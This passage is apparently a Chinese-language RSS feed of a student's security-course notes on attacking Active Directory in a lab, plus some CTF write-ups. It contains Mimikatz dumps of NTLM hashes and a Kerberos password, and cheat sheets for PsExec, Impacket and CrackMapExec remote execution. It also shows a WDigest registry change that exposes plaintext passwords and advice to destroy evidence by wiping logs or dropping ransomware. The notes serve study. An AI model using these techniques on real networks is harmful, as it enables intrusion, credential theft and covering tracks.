CachedInteractive from 1 User Name : Administrator Domain : kuma Logon Server : WIN-818G5VCOLJO Logon Time : 2023/9/4 10:19:22 SID : S-1-5-21-306106713-2531972042-334329499-500 msv :	[00000003] Primary * Username : Administrator * Domain : kuma * NTLM : 7ecffff0c3548187607a14bad0f88bb1 * SHA1 : 47af9144ed0e6f8964c1453dc7c2219dbdf046f0 * DPAPI : cf967ea9c9c0f9d58b79fdd040270648 tspkg :	wdigest :	* Username : Administrator * Domain : kuma * Password : (null) kerberos :	* Username : Administrator * Domain : KUMA.ORG * Password : (null) ssp :	credman :	cloudap :	Authentication Id : 0 ; 16441076 (00000000:00fadef4) Session : Interactive from 1 User Name : administrator Domain : kuma Logon Server : WIN-818G5VCOLJO Logon Time : 2023/9/4 12:44:48 SID : S-1-5-21-306106713-2531972042-334329499-500 msv :	[00000003] Primary * Username : Administrator * Domain : kuma * NTLM : 7ecffff0c3548187607a14bad0f88bb1 * SHA1 : 47af9144ed0e6f8964c1453dc7c2219dbdf046f0 * DPAPI : cf967ea9c9c0f9d58b79fdd040270648 tspkg :	wdigest :	* Username : Administrator * Domain : kuma * Password : (null) kerberos :	* Username : administrator * Domain : KUMA.ORG * Password : (null) ssp :	credman :	cloudap :	Authentication Id : 0 ; 14849757 (00000000:00e296dd) Session : Service from 0 User Name : DefaultAppPool Domain : IIS APPPOOL Logon Server : (null) Logon Time : 2023/9/3 09:44:12 SID : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415 msv :	[00000003] Primary * Username : DESKTOP-G95U93T$ * Domain : kuma * NTLM : 5648c9d78a770f3e0f727a5fac99da5a * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221 tspkg :	wdigest :	* Username : DESKTOP-G95U93T$ * Domain : kuma * Password : (null) kerberos :	* Username : DESKTOP-G95U93T$ * Domain : kuma.org * Password : maj"2g&lt;h(&amp;iQZ7kqFHQ4X&amp;c;_wQq3V;*gq.(A=4&amp;)\2eesNp8S=W)C,"nM:ns?6m.%;K4+CSGDFew>VaNQ;N_)?mB1\P9udE7Gs'Lsr ccxo*CyL=JdK"'kF ssp :	credman :	cloudap :	Authentication Id : 0 ; 1299130 (00000000:0013d2ba) Session : Interactive from 1 User Name : bear Domain : kuma Logon Server : WIN-818G5VCOLJO Logon Time : 2023/8/29 12:47:58 SID : S-1-5-21-306106713-2531972042-334329499-2101 msv :	[00000003] Primary * Username : bear * Domain : kuma * NTLM : 7ecffff0c3548187607a14bad0f88bb1 * SHA1 : 47af9144ed0e6f8964c1453dc7c2219dbdf046f0 * DPAPI : 4057a0d0b94378dd03224e8b3d28a006 tspkg :	wdigest :	* Username : bear * Domain : kuma * Password : (null) kerberos :	* Username : bear * Domain : KUMA.ORG * Password : (null) ssp :	credman :	cloudap :	Authentication Id : 0 ; 995 (00000000:000003e3) Session : Service from 0 User Name : IUSR Domain : NT AUTHORITY Logon Server : (null) Logon Time : 2023/8/29 12:40:42 SID : S-1-5-17 msv :	tspkg :	wdigest :	* Username : (null) * Domain : (null) * Password : (null) kerberos :	ssp :	credman :	cloudap :	Authentication Id : 0 ; 997 (00000000:000003e5) Session : Service from 0 User Name : LOCAL SERVICE Domain : NT AUTHORITY Logon Server : (null) Logon Time : 2023/8/29 12:40:39 SID : S-1-5-19 msv :	tspkg :	wdigest :	* Username : (null) * Domain : (null) * Password : (null) kerberos :	* Username : (null) * Domain : (null) * Password : (null) ssp :	credman :	cloudap :	Authentication Id : 0 ; 70138 (00000000:000111fa) Session : Interactive from 1 User Name : DWM-1 Domain : Window Manager Logon Server : (null) Logon Time : 2023/8/29 12:40:38 SID : S-1-5-90-0-1 msv :	[00000003] Primary * Username : DESKTOP-G95U93T$ * Domain : kuma * NTLM : 5648c9d78a770f3e0f727a5fac99da5a * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221 tspkg :	wdigest :	* Username : DESKTOP-G95U93T$ * Domain : kuma * Password : (null) kerberos :	* Username : DESKTOP-G95U93T$ * Domain : kuma.org * Password : maj"2g&lt;h(&amp;iQZ7kqFHQ4X&amp;c;_wQq3V;*gq.(A=4&amp;)\2eesNp8S=W)C,"nM:ns?6m.%;K4+CSGDFew>VaNQ;N_)?mB1\P9udE7Gs'Lsr ccxo*CyL=JdK"'kF ssp :	credman :	cloudap :	Authentication Id : 0 ; 70109 (00000000:000111dd) Session : Interactive from 1 User Name : DWM-1 Domain : Window Manager Logon Server : (null) Logon Time : 2023/8/29 12:40:38 SID : S-1-5-90-0-1 msv :	[00000003] Primary * Username : DESKTOP-G95U93T$ * Domain : kuma * NTLM : 5648c9d78a770f3e0f727a5fac99da5a * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221 tspkg :	wdigest :	* Username : DESKTOP-G95U93T$ * Domain : kuma * Password : (null) kerberos :	* Username : DESKTOP-G95U93T$ * Domain : kuma.org * Password : maj"2g&lt;h(&amp;iQZ7kqFHQ4X&amp;c;_wQq3V;*gq.(A=4&amp;)\2eesNp8S=W)C,"nM:ns?6m.%;K4+CSGDFew>VaNQ;N_)?mB1\P9udE7Gs'Lsr ccxo*CyL=JdK"'kF ssp :	credman :	cloudap :	Authentication Id : 0 ; 996 (00000000:000003e4) Session : Service from 0 User Name : DESKTOP-G95U93T$ Domain : kuma Logon Server : (null) Logon Time : 2023/8/29 12:40:38 SID : S-1-5-20 msv :	[00000003] Primary * Username : DESKTOP-G95U93T$ * Domain : kuma * NTLM : 5648c9d78a770f3e0f727a5fac99da5a * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221 tspkg :	wdigest :	* Username : DESKTOP-G95U93T$ * Domain : kuma * Password : (null) kerberos :	* Username : desktop-g95u93t$ * Domain : KUMA.ORG * Password : (null) ssp :	credman :	cloudap :	Authentication Id : 0 ; 47346 (00000000:0000b8f2) Session : Interactive from 1 User Name : UMFD-1 Domain : Font Driver Host Logon Server : (null) Logon Time : 2023/8/29 12:40:38 SID : S-1-5-96-0-1 msv :	[00000003] Primary * Username : DESKTOP-G95U93T$ * Domain : kuma * NTLM : 5648c9d78a770f3e0f727a5fac99da5a * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221 tspkg :	wdigest :	* Username : DESKTOP-G95U93T$ * Domain : kuma * Password : (null) kerberos :	* Username : DESKTOP-G95U93T$ * Domain : kuma.org * Password : maj"2g&lt;h(&amp;iQZ7kqFHQ4X&amp;c;_wQq3V;*gq.(A=4&amp;)\2eesNp8S=W)C,"nM:ns?6m.%;K4+CSGDFew>VaNQ;N_)?mB1\P9udE7Gs'Lsr ccxo*CyL=JdK"'kF ssp :	credman :	cloudap :	Authentication Id : 0 ; 46297 (00000000:0000b4d9) Session : Interactive from 0 User Name : UMFD-0 Domain : Font Driver Host Logon Server : (null) Logon Time : 2023/8/29 12:40:38 SID : S-1-5-96-0-0 msv :	[00000003] Primary * Username : DESKTOP-G95U93T$ * Domain : kuma * NTLM : 5648c9d78a770f3e0f727a5fac99da5a * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221 tspkg :	wdigest :	* Username : DESKTOP-G95U93T$ * Domain : kuma * Password : (null) kerberos :	* Username : DESKTOP-G95U93T$ * Domain : kuma.org * Password : maj"2g&lt;h(&amp;iQZ7kqFHQ4X&amp;c;_wQq3V;*gq.(A=4&amp;)\2eesNp8S=W)C,"nM:ns?6m.%;K4+CSGDFew>VaNQ;N_)?mB1\P9udE7Gs'Lsr ccxo*CyL=JdK"'kF ssp :	credman :	cloudap :	Authentication Id : 0 ; 44132 (00000000:0000ac64) Session : UndefinedLogonType from 0 User Name : (null) Domain : (null) Logon Server : (null) Logon Time : 2023/8/29 12:40:37 SID : msv :	[00000003] Primary * Username : DESKTOP-G95U93T$ * Domain : kuma * NTLM : 5648c9d78a770f3e0f727a5fac99da5a * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221 tspkg :	wdigest :	kerberos :	ssp :	credman :	cloudap :	Authentication Id : 0 ; 999 (00000000:000003e7) Session : UndefinedLogonType from 0 User Name : DESKTOP-G95U93T$ Domain : kuma Logon Server : (null) Logon Time : 2023/8/29 12:40:37 SID : S-1-5-18 msv :	tspkg :	wdigest :	* Username : DESKTOP-G95U93T$ * Domain : kuma * Password : (null) kerberos :	* Username : desktop-g95u93t$ * Domain : KUMA.ORG * Password : (null) ssp :	credman :	cloudap :	::: 可以看到這一份檔案比前面提到的SAM還要完整很多，用log的原因是他會把輸出dump下來，用熟悉的文字編輯器尋找有用的資訊比較方便，另外，==Privilege::Debug==的意思是跟windows取得debug lsass的權限</description></item><item><title>NTUSTISC - AD Note - Lab(遠端執行(RDP))</title><link>https://bernie6401.github.io/security/course/ntust-isc/ad/4.-%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8C-%E8%AE%80%E6%AA%94/ntustisc---ad-note---lab0x22%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8Crdp/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-isc/ad/4.-%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8C-%E8%AE%80%E6%AA%94/ntustisc---ad-note---lab0x22%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8Crdp/index.html</guid><description>NTUSTISC - AD Note - Lab(遠端執行(RDP)) [TOC]
Lecture Video: 2022/05/11 AD 安全 2 Background What is EULA?
終端使用者授權合約（英語：end-user license agreements，英文縮寫：EULA）是指軟體的開發者或發行者授權使用者使用特定軟體產品時的規定，大多私有軟體附帶此合約，如不接受則無法安裝。不過自由軟體則較少使用這個合約
Lab 此Lab主要是要讓我們可以遠端執行其他人的電腦，當我們已經取得local admin時，但domain admin遲遲沒有出現，我們就需要多找幾台主機試看看，可不可以登入或是遠端連線，這樣從一台主機出發，多幾台主機一起蹲domain admin的機會就會變大，可能會有疑問，要怎麼知道其他電腦的密碼呢?如果這一間公司它沒有使用之前介紹過的LAPS密碼管理工具，而且又是委外管理，則很有可能會有多台主機的密碼都一樣，然後再用前面提到的多種密碼提取方法(Brute Force SAM/Password Spraying etc)，得到更多台主機的密碼，然後再利用Mimikatz之類的工具把lsass的info leak出來，就有可能得到domain admin的密碼
==遠端執行(RDP)== Linux / Kali Tools xfreerdp $ sudo apt install freerdp2-x11 -y Libfreerdp 先到https://packages.debian.org/sid/libfreerdp-client2-2這個頁面看一下要下載哪一個版本，Kali是amd64 $ cd ~/Downloads $ wget http://ftp.tw.debian.org/debian/pool/main/f/freerdp2/libfreerdp-client2-2_2.10.0+dfsg1-1.1_amd64.deb Windows Tools: Psexec.exe 微軟的遠端執行工具，具有微軟的簽章，第一次使用需要接受EULA $ PsExec.exe -i \\&lt;Remote IP> -accepteula -u [&lt;domain>]\&lt;Remote Username> -p &lt;Remote Password> cmd ==How to use xfreerdp== 網路上有很多文章和教學12，不過他們的情況和我們的狀況有點不一樣 :::success 使用條件：Win2016一定要打開，事先取得帳號的密碼 :::</description></item><item><title>NTUSTISC - AD Note - Lab(遠端執行(RDP)2)</title><link>https://bernie6401.github.io/security/course/ntust-isc/ad/4.-%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8C-%E8%AE%80%E6%AA%94/ntustisc---ad-note---lab0x23%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8Crdp2/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-isc/ad/4.-%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8C-%E8%AE%80%E6%AA%94/ntustisc---ad-note---lab0x23%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8Crdp2/index.html</guid><description>NTUSTISC - AD Note - Lab(遠端執行(RDP)2) [TOC]
Lecture Video: 2022/05/11 AD 安全 2 Background NTUSTISC - AD Note - Lab(Password Spraying) 滲透測試的利器 - Impacket:
python撰寫的內網滲透工具
Lab ==遠端執行(RDP)2== Kali-Linux Tools Impacket(Kali-Linux愛好者可使用的PsExec) # Set up &amp; Install $ git clone https://github.com/fortra/impacket.git $ cd impacket $ conda activate py3.7 # Recommended to install it in conda $ pip3 install -r requirements.txt $ python3 setup.py install # Cheat-Sheet $ conda activate py3.7 $ proxychains psexec.py &lt;username>:&lt;password>@&lt;ip> whoami CrackMapExec $ crackmapexec smb [IP] -u &lt;username> -p &lt;password --exec-method smbexec -x '&lt;command>' exec-method支援以下方法: * mmcexec * smbexec * wmiexec * atexec ==How to use Impacket== 感覺應該是proxychains壞掉了，或是有一些其他問題，導致Connection Refused，總而言之，這套工具就是讓kali-linux也可以使用psexec這個工具</description></item><item><title>NTUSTISC - AD Note - Lab(錯誤配置)</title><link>https://bernie6401.github.io/security/course/ntust-isc/ad/2.-%E6%8F%90%E5%8D%87%E6%AC%8A%E9%99%90/ntustisc---ad-note---lab0x12%E9%8C%AF%E8%AA%A4%E9%85%8D%E7%BD%AE/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-isc/ad/2.-%E6%8F%90%E5%8D%87%E6%AC%8A%E9%99%90/ntustisc---ad-note---lab0x12%E9%8C%AF%E8%AA%A4%E9%85%8D%E7%BD%AE/index.html</guid><description>NTUSTISC - AD Note - Lab(錯誤配置) [TOC]
Lecture Video: 2022/05/04 AD 安全1
Background 提權方法 利用弱點 Hijack Token Guess Password 管理服務 錯誤配置 服務使用高權限執行且檔案權限配置錯誤，所以只要把這項服務替換成惡意程式，最後再利用前面提到的print operator重開機，就可以達到控制的目的 透過accesschk.exe找出有問題的地方 $ accesschk.exe &lt;user> &lt;path> For example $ accesschk.exe "Administrator" "C:\Program Files\" Accesschk v6.15 - Reports effective permissions for securable objects Copyright (C) 2006-2022 Mark Russinovich Sysinternals - www.sysinternals.com RW C:\Program Files Lab Time - 本地提權 ==錯誤配置== 找出low有存取權限的service檔案
$ accesschk.exe "low" "C:\tools" Accesschk v6.15 - Reports effective permissions for securable objects Copyright (C) 2006-2022 Mark Russinovich Sysinternals - www.sysinternals.com RW C:\tools\AccessChk RW C:\tools\accesschk.exe RW C:\tools\AccessChk.zip RW C:\tools\BloodHound-master RW C:\tools\BloodHound-win32-x64 RW C:\tools\BloodHound-win32-x64-4.0.3.zip RW C:\tools\BloodHound-win32-x64-4.1.0 RW C:\tools\BloodHound-win32-x64-4.1.0.zip RW C:\tools\Certify.exe RW C:\tools\DNSAdmin-DLL.dll RW C:\tools\KDU-1.1.0 RW C:\tools\KmdManager.exe RW C:\tools\mimikatz_trunk RW C:\tools\neo4j-community-4.3.4 RW C:\tools\neo4j-community-4.3.4-windows.zip RW C:\tools\nopad RW C:\tools\openssl.zip RW C:\tools\PrintSpoofer64.exe RW C:\tools\Procdump RW C:\tools\ProcessExplorer RW C:\tools\PSTools RW C:\tools\Rubeus.exe RW C:\tools\Windows-Kernel-Explorer-master</description></item><item><title>NTUSTISC - AD Note - Lab(顯示Mimikatz的明文)</title><link>https://bernie6401.github.io/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x19%E9%A1%AF%E7%A4%BAmimikatz%E7%9A%84%E6%98%8E%E6%96%87/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x19%E9%A1%AF%E7%A4%BAmimikatz%E7%9A%84%E6%98%8E%E6%96%87/index.html</guid><description>NTUSTISC - AD Note - Lab(顯示Mimikatz的明文) [TOC]
Lecture Video: 2022/05/04 AD 安全1
Background 之前在進行mimikatz的實作時，會看到很多wdigest是(null)的情況，主要原因是windows的設定的問題，所以只要把設定改回來，就可以正常顯示了，主要是windows不主動存取明文密碼
What is WDigest WDigest即摘要身份驗證，摘要身份驗證是一種質詢/響應協議，主要在WindowsServer2003中用於LDAP和基於Web的身份驗證。它利用超文本傳輸協議(HTTP)和簡單身份驗證安全層(SASL)交換進行身份驗證
什麼是安全性識別碼？
安全性識別碼可用來唯一識別安全性主體或安全性群組。 安全性主體可以代表可由作業系統驗證的任何實體，例如使用者帳戶、電腦帳戶，或在使用者或電腦帳戶的安全性內容中執行的執行緒或進程。
每個帳戶或群組，或帳戶安全性內容中執行的每個進程，都有由授權單位發出的唯一 SID，例如 Windows 網域控制站。 SID 會儲存在安全性資料庫中。 系統會產生 SID，以識別建立帳戶或群組時的特定帳戶或群組。 當 SID 做為使用者或群組的唯一識別碼時，永遠不會再次用來識別其他使用者或群組。
Lab ==顯示Mimikatz的明文== 只要打開regedit，在電腦\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest可能會看到UseLogonCredential的名稱，只要把對應的數值改成1就可以了，當然如果沒看到的話也可以自己新增 重開機 重開機前可以先把之前mimikatz的結果存起來，照樣之後可以對照著看
Result 我挑了幾個SID一樣的結果來看 左邊的是新增config之前，右邊的是重開機之後，可以看到原本(null)的地方大部分都有被顯示出來</description></item><item><title>NTUSTISC - AD Note - 會後提及有用的工具</title><link>https://bernie6401.github.io/security/course/ntust-isc/ad/ntustisc---ad-note---%E6%9C%83%E5%BE%8C%E6%8F%90%E5%8F%8A%E6%9C%89%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-isc/ad/ntustisc---ad-note---%E6%9C%83%E5%BE%8C%E6%8F%90%E5%8F%8A%E6%9C%89%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7/index.html</guid><description>NTUSTISC - AD Note - 會後提及有用的工具 [TOC]
Lecture Video: 2022/05/04 AD 安全1
Background EDR(Endpoint Detection and Response) 端點偵測及回應 (EDR) 結合了即時的持續監控、端點資料蒐集，以及進階交叉關聯，來偵測並回應主機和端點連線的可疑活動。這套方法可讓資安團隊快速發掘並交叉分析各種活動來產生高可信度的偵測事件，並提供手動和自動化回應選項。
EDR 解決方案會記錄端點上發生的所有活動和事件。某些廠商或許還會將這項服務延伸至任何與您網路相連的工作負載。然後，這些記錄 (或事件記錄檔) 可用來發掘原本不會被發現的資安事件。即時的監控可以更快偵測威脅，不讓威脅有機會擴散至使用者端點之外。
其實就是把我們感興趣的log抓出來而已
XDR(Extended detection and response) XDR (延伸式偵測及回應) 可蒐集並自動交叉關聯涵蓋多個防護層的資料，包括：電子郵件、端點、伺服器、雲端工作負載以及網路。如此可藉由資安分析來提供更快的威脅偵測，提升調查與回應時間。
XDR 能打破資安產品之間的藩籬，採用一種全方位面面俱到的偵測及回應方法。XDR 可蒐集並透過交叉關聯涵蓋多個防護層的偵測事件與深入的活動資料，包括：電子郵件、端點、伺服器、雲端工作負載以及網路。如此豐富的資料若能透過自動化分析，就能更快偵測威脅，同時也讓資安分析師擁有適當的工具可完成更多任務，並透過調查來採取更迅速的行動。 簡單來說EDR只能特定範圍或是單一產品上做到端點偵測，但XDR是能夠跨各個資安產品或是layer達到更全面的偵測以及比對事件的結果
MDR(Managed Detection and Response) 提供專業的資安人員來協助企業進行監控網路、分析事件、並且回應所遭遇的資安狀況如何做出對應的應變
是一種服務 藉由資安專家的服務，提供及時、有效的處理，以避免損失擴大 將安全專業知識外包給專業的人員 分析警示當中潛藏的危險徵兆 如何滅證 只要讓windows保持預設值或是把event file砍掉就好了，因為windows10會記錄很多使用者的狀況，例如Quick Access的使用路徑或是使用者之前使用過的應用程式的縮圖等等，所以最暴力的方式是離開之前丟一個勒索病毒，它就會針對常見的file進行加密，這樣縱使不把東西刪掉，鑑識人員也不會知道裡面的內容是甚麼
如果正在使用Win2008/2012 請趕快升級成Win2016，因為有很多攻擊手段是到win2016的就失效的，例如前面提到的wdigest在2008/2012是會開的，因為這樣在認證上才會成功
什麼是誘捕系統（Honey Pot）？ 就像是一罐用來吸引、捕捉昆蟲的蜂蜜，所謂的誘捕系統（Honey Pot）就是一個吸引攻擊者的目標，透過誘捕的手法，吸引駭客發動攻擊，以蒐集攻擊者的來源以及攻擊手法，現在除了應用在蒐集病毒特徵、攻擊手法，也用來蒐集假網站的IP，以及散布木馬或間諜程式等惡意來源名單，藉此觀察病蠕蟲、駭客入侵或惡意攻擊的來源、手段、管道及模式，由於會將所有攻擊動作與過程記錄下來，已經成為蒐集駭客資訊的重要方式之ㄧ。
此外，誘捕系統還具有消耗攻擊時間、轉移攻擊目標等的功能。一個「接近真實」的誘補系統必須定期更新與維護，才能與駭客互動、吸引駭客長時間注意，除了提供詳盡的攻擊細節，研究人員必須觀察攻擊者的動機，並擬定因應對策，而系統也必須定期清除所遭受到的感染。
什麼是SCCM? Microsoft System Center Configuration Manager</description></item><item><title>NTUSTISC - AD Note - 環境建置 &amp; Background</title><link>https://bernie6401.github.io/security/course/ntust-isc/ad/ntustisc---ad-note---0x01%E7%92%B0%E5%A2%83%E5%BB%BA%E7%BD%AE--background/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-isc/ad/ntustisc---ad-note---0x01%E7%92%B0%E5%A2%83%E5%BB%BA%E7%BD%AE--background/index.html</guid><description>NTUSTISC - AD Note - 環境建置 &amp; Background [TOC]
Lecture Video: 2022/05/04 AD 安全1
Background What is Directory Service?1
Windows Server 系統使用的目錄服務 就是 Active Directory
What is Active Directory(AD)?2
Windows的Windows Server中，負責架構中大型網路環境的集中式目錄管理服務(Directory Services)，他處理在組織中的網路物件，物件可以是使用者、群組、電腦、網域控制站、郵件、設定檔、組織單元、樹系等等，只要是在AD結構定義檔(Schema)中定義的物件，就可以儲存在AD資料檔中，並利用AD Service Interface來存取
What is Domain Service?1
執行 AD DS 的伺服器稱為 domain controllers (DCs)</description></item><item><title>NTUSTISC - AD Note(Lab - 查詢網域使用者)</title><link>https://bernie6401.github.io/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x03%E6%9F%A5%E8%A9%A2%E7%B6%B2%E5%9F%9F%E4%BD%BF%E7%94%A8%E8%80%85/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x03%E6%9F%A5%E8%A9%A2%E7%B6%B2%E5%9F%9F%E4%BD%BF%E7%94%A8%E8%80%85/index.html</guid><description>NTUSTISC - AD Note(Lab - 查詢網域使用者) [TOC]
Lecture Video: 2022/05/04 AD 安全1
Lab Time - 環境調查 ==查詢網域使用者== 常用的cheat sheet
$ net user /domain $ net user &lt;username> /domain :::spoiler Implementation
$ net user /domain 這項要求會在網域 kuma.org 下的網域控制站處理。 \\WIN-818G5VCOLJO.kuma.org 的使用者帳戶 ------------------------------------------------------------------------------- Administrator aleda.appolonia alikee.perri aloise.elfrida amabelle.gayle andree.suki angelique.hilda annice.eden anya.gypsy audi.rosalind babb.joanne bambi.etta bear berget.celka berna.raphaela berny.kirby bill.marylee caitrin.latia carey.kincaid carlye.chloette carmelle.libbi casandra.cherrita casi.hyacinth cassondra.lothario celeste.kelci charis.kory christi.nettle coraline.mahalia corine.celesta cyndie.rhodie daile.odetta darlleen.dorisa DefaultAccount dollie.fayina dominica.carmon dorrie.paolina eba.luca ella.randee erena.elinore fara.iseabal fred.carmita gabriel.diannne garnet.constancia gertrude.felecia gillian.marsiella giulietta.moyra glenda.dorrie Guest henrieta.sabine herminia.debby issy.eudora jerrie.morganne jessa.corinna jori.floria joyann.sibella kaja.brenda karoly.nadeen katee.annemarie katharina.alyssa kiri.kath kizzee.margaux krbtgt laurena.mirelle lazaro.karoly lilas.lindy lily.kristofor lina.allene linda.neda logan.janeen lon.sonni lorne.celie lucilia.lelah margo.sharl marlyn.loralee marney.ranee martita.juanita marylynne.susannah maurizia.ines mercy.edi moyra.fanechka nolana.rivy ollie.dorita orelee.peri ortensia.fancy philippa.eugenie philis.gilli pietra.fern randene.lelah ranee.delinda reina.claire renae.babette reyna.gwendolyn ricca.stefa ronni.kristoforo rosetta.lotta ruthann.britta ruthie.ebony seana.jeanette selestina.cassi shantee.marylin sherri.jacquetta sile.rhiamon sofie.darlleen star.rikki stormie.natala 命令已經成功完成。 ::: 說明：如果目前登入的帳號是在domain底下，就會出現類似如上的結果，會有一大堆使用者，但是目前的帳號沒有在該domain底下，會出現以下error:</description></item><item><title>NTUSTISC - CyberDefender - MrRobot - Target 1</title><link>https://bernie6401.github.io/security/practice/cyberdefender/endpoint-forensic/mrrobot---medium/cyberdefender---mrrobot---target-1/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/cyberdefender/endpoint-forensic/mrrobot---medium/cyberdefender---mrrobot---target-1/index.html</guid><description>NTUSTISC - CyberDefender - MrRobot - Target 1 Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/88 Target 2: https://hackmd.io/@SBK6401/HJz2FPne6 POS: https://hackmd.io/@SBK6401/BJpJqDhlp
:::spoiler TOC [TOC] ::: Lecture Video: 2022/06/29 藍隊安全系列課程 04 Volatility - Cheat Sheet
Background vmss2core 題目下載之後會得到一些.vmss的檔案，這時候就需要下載vmss2core.exe，.vmss是VMware經過轉換的snapshot，而這個工具可以把snapshot轉換成memory dump :::spoiler Execution Result $ vmss2core-sb-8456865.exe -W .\c69-Grrcon2015\pos01\POS-01-c4e8f786.vmss vmss2core version 8456865 Copyright (C) 1998-2017 VMware, Inc. All rights reserved. ... 10 MBs written. ... 20 MBs written. ... 30 MBs written. ... ... 1020 MBs written. Finished writing core. ::: Volatility3: 安裝可以直接參考影片，建議直接使用windows exe protable file，這樣比較方便也穩定，而且還不需要擔心環境的問題 Lab - Target 1 起手式 $ python vol.py -f memory.dmp imageinfo Volatility Foundation Volatility Framework 2.6.1 INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile(s) : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86_24000, Win7SP1x86 (Instantiated with WinXPSP2x86) AS Layer1 : IA32PagedMemoryPae (Kernel AS) AS Layer2 : WindowsCrashDumpSpace32 (Unnamed AS) AS Layer3 : FileAddressSpace (D:\Downloads\Trash\CyberDefenders\c69-Grrcon2015\target1\memory.dmp) PAE type : PAE DTB : 0x3ecc3260L KUSER_SHARED_DATA : 0xffdf0000L Image date and time : 2015-10-09 12:53:02 UTC+0000 Image local date and time : 2015-10-09 08:53:02 -0400 重要資訊System Name: Win7SP0x86</description></item><item><title>PicoCTF - `tunn3l v1s10n`</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/image-stego/picoctf---tunn3l-v1s10n/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/image-stego/picoctf---tunn3l-v1s10n/index.html</guid><description>PicoCTF - tunn3l v1s10n tags: PicoCTF CTF Misc Challenge: tunn3l v1s10n
Background [筆記] BMP點陣圖格式說明
Exploit - Recover file Analyze $ exiftool tunn3l_v1s10n ExifTool Version Number : 11.88 File Name : tunn3l_v1s10n Directory : . File Size : 2.8 MB File Modification Date/Time : 2023:02:17 04:11:33+08:00 File Access Date/Time : 2023:02:17 04:12:37+08:00 File Inode Change Date/Time : 2023:02:17 04:11:35+08:00 File Permissions : rw-r--r-- File Type : BMP File Type Extension : bmp MIME Type : image/bmp BMP Version : Unknown (53434) Image Width : 1134 Image Height : 306 Planes : 1 Bit Depth : 24 Compression : None Image Length : 2893400 Pixels Per Meter X : 5669 Pixels Per Meter Y : 5669 Num Colors : Use BitDepth Num Important Colors : All Red Mask : 0x27171a23 Green Mask : 0x20291b1e Blue Mask : 0x1e212a1d Alpha Mask : 0x311a1d26 Color Space : Unknown (,5%() Rendering Intent : Unknown (826103054) Image Size : 1134x306 Megapixels : 0.347 It seems a bmp file and check the file signature of the 2 bytes is 42 4D :heavy_check_mark: Check file headers According to BMP_file_format and BMP點陣圖格式說明 :heavy_check_mark:size: 8E 26 2C 00 $\to$ 0x2C268E $\to$ 2893454 bytes :heavy_check_mark:reserved1: 00 00 :heavy_check_mark:reserved2: 00 00 :negative_squared_cross_mark:offset: BA D0 00 00 $\to$ 0xD0BA $\to$ 53434 means it’ll read the bitmap data from offset 53434 bytes. But actually, the data of bitmap is just connect with the header. So, we just need to shift 14 bytes for file header + 40 bytes for info header = 54 bytes $\to$ 0x36 We can peek the data first… It said notaflag{sorry}, means we need to recover other parts.</description></item><item><title>PicoCTF - `Wireshark doo dooo do doo...`</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/flow/picoctf---wireshark-doo-dooo-do-doo.../index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/flow/picoctf---wireshark-doo-dooo-do-doo.../index.html</guid><description>PicoCTF - Wireshark doo dooo do doo... tags: PicoCTF CTF Misc Challenge: https://play.picoctf.org/practice/challenge/115?category=4&amp;page=1
